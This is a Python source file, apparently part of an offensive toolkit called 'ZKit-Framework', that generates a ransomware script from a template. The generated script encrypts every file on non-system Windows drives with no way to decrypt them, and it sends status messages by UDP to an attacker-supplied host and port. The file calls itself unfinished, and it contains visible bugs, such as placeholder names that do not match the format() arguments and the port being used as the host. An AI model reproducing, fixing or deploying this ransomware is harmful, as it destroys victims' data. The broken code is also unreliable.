'Ransomware Script A Part Of ZKit-Framework : Not Completed'
from colorama import Fore
import random


def Create(*self, Attacker_ip, Attacker_port, password = None , list_of_strs : list , characters):
    'Creates Ransomware with a special key 728 Bit'
    s = list_of_strs
    if password == None :
        from .. import Main_Process
        print("No Password Was Set Using A Random One")
        encrypt_key , password = Main_Process.generate_key(password)
        print('Your Random Password is : {}'.format(password))
    Ransomware_Data = """
from os import walk
import win32.win32api as win32
import socket
{Connection} = None
def {Get_Drives}():
    {drives} = win32.GetLogicalDriveStrings()
    {drives} = {drives}.split('\000')[:-1]
    return {drives}
def {Encrypt}({PATH}):
    f = open({PATH} , "rb+")
    {data} = str(f.read())
    {size} = len({data})
    {encrypt_key} = "{Encrypt_Key_Data}"
    {encrypt_key} = list({encrypt_key})
    {characters} = {characters_data}
    {result} = ""
    for i in range(0, {size}) :
        try:
            result += {encrypt_key}[{characters}.index({data}[i])]
        except:
            pass
    f = open({PATH} , "rb+")
    f.truncate()
      
    f.write({result})
    f.close()

def {Connect_to_Attacker}():
    global {Connection}
    {Connection} = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
    port = {p} 
    host = "{h}"
    {Connection}.connect((host , port)) 
    {Connection}.send('Starting of Encryption'.encode('UTF-8'))
    
def {Run}():
    {Drives} = {Get_Drives}()
    {Drives}.pop({Drives}.index('C:\\'))
    for i in range(0 , len({Drives})) :
        {drive} = {Drives}[i]
        {script} = argv[0].replace(":\\" , ":/").replace({script}[0] , {script}[0].upper() , -1 )
        for root , dirnames , filenames in walk({drive}) :
            for i in range( 0 , len(filenames)) :
                {F} = filenames[i]
                {data} = "{r}{f}".format(r = root, f = {F}).replace("\\" , "/" , -1)
                if {data} != {script}:
                    {Encrypt}({data})
                
    {Connection}.send('Encryption Done There Is No Decryption Method In This File.'.encode('UTF-8'))

if __name__ == '__main__' :
    {Connect_To_Attacker}()
    {Run}()
            """.format(Connection = s[0], Get_drives = s[1], drives = s[2],
                       Encrypt = s[3], PATH = s[4] , data = s[5] , size = s[6], 
                       encrypt_key = s[7], encrypt_key_data = encrypt_key , 
                       characters = s[8] , characters_data = s[9],
                       result = s[10], Connect_to_Attacker = s[15] , 
                       p = Attacker_port , h = Attacker_port,
                       Run = s[11], Drives = s[12], drive = s[13], script = s[14],
    )                  
    return Ransomware_Data